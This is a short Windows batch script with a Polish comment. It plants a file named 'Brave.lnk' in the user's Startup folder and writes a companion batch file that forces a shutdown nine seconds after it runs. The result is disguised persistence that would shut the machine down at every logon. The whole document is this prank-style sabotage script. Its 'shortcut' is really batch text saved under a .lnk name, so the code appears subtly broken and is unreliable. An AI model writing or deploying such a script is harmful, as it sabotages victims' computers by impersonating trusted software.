@echo off

setlocal enabledelayedexpansion

set "where=%~dp0"
set "desktop=%USERPROFILE%\Desktop"
set "startup=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

set "timestamp=%date:~4,2%%date:~7,2%%time:~0,2%%time:~3,2%%time:~6,2%"
set "filename=%timestamp%"

REM Utwórz skrót do cmd.exe podszywający się pod Brave i umieść w folderze startowym
echo @echo off > "%startup%\Brave.lnk"
echo start cmd.exe /c "start /b /min ""Brave"" ^"!where!%filename%.bat^"" >> "%startup%\Brave.lnk"

echo @echo off > "!where!%filename%.bat"
echo shutdown -s -t 9 >> "!where!%filename%.bat"

exit 0